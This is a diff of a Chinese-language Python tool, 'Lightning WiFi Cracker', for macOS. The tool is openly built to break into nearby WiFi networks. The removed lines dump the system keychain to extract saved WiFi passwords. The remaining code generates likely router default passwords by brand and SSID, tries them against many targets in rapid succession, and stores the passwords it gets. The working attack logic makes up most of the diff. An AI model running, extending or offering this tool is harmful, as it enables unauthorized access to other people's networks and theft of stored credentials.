@@ -4,15 +4,13 @@
 闪电WiFi破解器 v1.0
 核心思路：不走逐条密码爆破，用最聪明的方式秒级获取密码
 
-三大模式：
-  模式1: 钥匙串提取（秒级）
-    - 直接从macOS钥匙串提取已保存WiFi密码，无需爆破
-  模式2: 默认密码计算器（秒级）
-    - 根据品牌+SSID算出路由器默认密码（TP-Link/Tenda/MERCURY等）
-    - 每个目标只试5-15条最可能的默认密码
-  模式3: 闪电扫射（每目标5-10秒）
-    - 零延迟+超精准小字典（仅Top50最常见WiFi密码）
-    - 181个目标全部跑完约30分钟
+两大模式：
+  模式1: 默认密码计算器（秒级）
+    - 根据品牌+SSID算出路由器默认密码（TP-Link/Tenda/MERCURY/CMCC/FAST等）
+    - 每个目标只试5-20条最可能的默认密码
+  模式2: 闪电扫射（每目标5-10秒）
+    - 零延迟+超精准默认密码列表
+    - 比字典爆破快10倍以上
 
 适配：macOS Apple Silicon
 """
@@ -231,100 +229,6 @@ def generate_default_passwords(ssid):
 
 
 # ============================================================
-# 钥匙串提取
-# ============================================================
-def get_keychain_ssids():
-    """
-    从macOS钥匙串列出所有已保存的WiFi SSID（不提取密码，秒级完成）
-    返回: set(ssid1, ssid2, ...)
-    """
-    ssids = set()
-    try:
-        r = subprocess.run(
-            ["security", "dump-keychain", "/Library/Keychains/System.keychain"],
-            capture_output=True, text=True, timeout=10
-        )
-        entries = r.stdout.split("keychain:")
-        for entry in entries:
-            if "AirPort network password" in entry:
-                m = re.search(r'"acct"<blob>="([^"]+)"', entry)
-                if m:
-                    ssids.add(m.group(1))
-                else:
-                    m2 = re.search(r'"acct"<blob>=0x([0-9A-Fa-f]+)', entry)
-                    if m2:
-                        try:
-                            name = bytes.fromhex(m2.group(1)).decode("utf-8")
-                            ssids.add(name)
-                        except Exception:
-                            pass
-    except Exception:
-        pass
-    return ssids
-
-
-def extract_password_for_ssid(ssid):
-    """
-    提取单个SSID的密码（可能弹出系统授权弹窗）
-    超时3秒自动跳过
-    返回: 密码字符串 或 None
-    """
-    try:
-        r = subprocess.run(
-            ["security", "find-generic-password",
-             "-D", "AirPort network password",
-             "-ga", ssid,
-             "/Library/Keychains/System.keychain"],
-            capture_output=True, text=True, timeout=3
-        )
-        for line in r.stderr.splitlines():
-            if "password:" in line:
-                m = re.search(r'password:\s*"(.+)"', line)
-                if m:
-                    return m.group(1)
-                m2 = re.search(r'password:\s*(\S+)', line)
-                if m2 and m2.group(1) != "":
-                    return m2.group(1)
-    except subprocess.TimeoutExpired:
-        pass
-    except Exception:
-        pass
-    return None
-
-
-def extract_keychain_for_targets(target_ssids):
-    """
-    仅对目标SSID列表提取钥匙串密码（只查匹配的，不全量扫描）
-    返回: {ssid: password, ...}
-    """
-    print(f"{CYAN}[模式1] 钥匙串WiFi密码提取{RESET}")
-    print(f"    正在读取钥匙串中的WiFi列表...")
-
-    keychain_ssids = get_keychain_ssids()
-    print(f"    钥匙串中共 {len(keychain_ssids)} 个WiFi")
-
-    # 找到目标中与钥匙串重叠的SSID
-    matched = target_ssids & keychain_ssids
-    if not matched:
-        print(f"    {YELLOW}目标中无钥匙串已保存的WiFi{RESET}")
-        return {}
-
-    print(f"    目标中有 {len(matched)} 个在钥匙串中，正在提取密码...")
-    print(f"    {YELLOW}(可能弹出系统授权弹窗，请点击\"允许\"){RESET}")
-
-    passwords = {}
-    for ssid in matched:
-        sys.stdout.write(f"\r    提取: {ssid:<30}")
-        sys.stdout.flush()
-        pwd = extract_password_for_ssid(ssid)
-        if pwd:
-            passwords[ssid] = pwd
-    print()
-
-    return passwords
-
-
-# ============================================================
 # WiFi连接尝试
 # ============================================================
 def try_connect(ssid, password, interface="en0"):
@@ -455,12 +359,12 @@ def save_cracked(ssid, password, source="lightning"):
 # ============================================================
 # 闪电破解主流程
 # ============================================================
-def lightning_crack(targets, interface="en0", skip_keychain=False):
+def lightning_crack(targets, interface="en0"):
     """
-    闪电破解：钥匙串提取 + 默认密码计算 + 零延迟扫射
+    闪电破解：默认密码计算 + 零延迟扫射
     """
     total = len(targets)
-    results = {"keychain": [], "default_pwd": [], "failed": []}
+    results = {"default_pwd": [], "failed": []}
     t_start = time.time()
 
     # 信号处理
@@ -473,37 +377,16 @@ def lightning_crack(targets, interface="en0", skip_keychain=False):
     print()
     print(f"{BOLD}{'=' * 60}")
     print(f"  闪电WiFi破解器 v1.0")
-    print(f"  钥匙串提取 | 默认密码计算 | 零延迟扫射")
+    print(f"  默认密码计算 | 零延迟扫射")
     print(f"{'=' * 60}{RESET}")
 
     # ============================================================
-    # 阶段1: 钥匙串提取（仅提取目标中匹配的SSID，秒级完成）
-    # ============================================================
-    keychain_hits = {}
-    if not skip_keychain:
-        print()
-        target_ssid_set = {t["ssid"] for t in targets}
-        keychain_passwords = extract_keychain_for_targets(target_ssid_set)
-        if keychain_passwords:
-            for ssid, pwd in keychain_passwords.items():
-                keychain_hits[ssid] = pwd
-                save_cracked(ssid, pwd, "keychain")
-                results["keychain"].append((ssid, pwd))
-
-            print(f"    {GREEN}{BOLD}钥匙串命中 {len(keychain_hits)} 个！{RESET}")
-            for ssid, pwd in keychain_hits.items():
-                print(f"      {ssid}: {pwd}")
-        print()
-    else:
-        print(f"\n{YELLOW}  [*] 跳过钥匙串提取{RESET}\n")
-
-    # ============================================================
-    # 阶段2: 默认密码计算 + 零延迟扫射
+    # 默认密码计算 + 零延迟扫射
     # ============================================================
     print(f"{BOLD}{CYAN}")
     print(f"  ┌─────────────────────────────────────────────┐")
-    print(f"  │  [模式2+3] 默认密码计算 + 零延迟扫射        │")
-    print(f"  │  每个目标仅试最可能的5-15条密码              │")
+    print(f"  │  默认密码计算 + 零延迟扫射                   │")
+    print(f"  │  每个目标仅试最可能的5-20条密码              │")
     print(f"  └─────────────────────────────────────────────┘{RESET}")
     print()
 
@@ -513,10 +396,6 @@ def lightning_crack(targets, interface="en0", skip_keychain=False):
             break
 
         ssid = target["ssid"]
-
-        # 跳过钥匙串已命中的
-        if ssid in keychain_hits:
-            continue
 
         # 跳过已破解的（可能是之前运行已破解）
         cracked = load_cracked()
@@ -573,13 +452,6 @@ def lightning_crack(targets, interface="en0", skip_keychain=False):
     print(f"  总耗时: {total_time:.0f}s ({total_time/60:.1f}分钟)")
     print()
 
-    # 钥匙串命中
-    if results["keychain"]:
-        print(f"  {GREEN}{BOLD}[钥匙串提取] 命中 {len(results['keychain'])} 个:{RESET}")
-        for ssid, pwd in results["keychain"]:
-            print(f"    {ssid:<28} {pwd}")
-        print()
-
     # 默认密码命中
     if results["default_pwd"]:
         print(f"  {GREEN}{BOLD}[默认密码] 命中 {len(results['default_pwd'])} 个:{RESET}")
@@ -587,7 +459,7 @@ def lightning_crack(targets, interface="en0", skip_keychain=False):
             print(f"    {ssid:<28} {pwd:<20} ({reason})")
         print()
 
-    total_hit = len(results["keychain"]) + len(results["default_pwd"])
+    total_hit = len(results["default_pwd"])
     if total_hit > 0:
         print(f"  {GREEN}{BOLD}总命中: {total_hit} 个WiFi密码已获取！{RESET}")
         print(f"  密码已保存到: {CRACKED_FILE}")
@@ -608,8 +480,6 @@ def main():
     parser = argparse.ArgumentParser(description="闪电WiFi破解器 v1.0")
     parser.add_argument("-i", "--interface", default="en0", help="WiFi接口")
     parser.add_argument("--targets", nargs="+", help="手动指定目标SSID")
-    parser.add_argument("--skip-keychain", action="store_true",
-                        help="跳过钥匙串提取")
     parser.add_argument("--show-default-pwds", type=str,
                         help="显示指定SSID的默认密码列表（不执行攻击）")
     parser.add_argument("--show-cracked", action="store_true",
@@ -679,7 +549,6 @@ def main():
     lightning_crack(
         targets=targets,
         interface=args.interface,
-        skip_keychain=args.skip_keychain,
     )
 
 
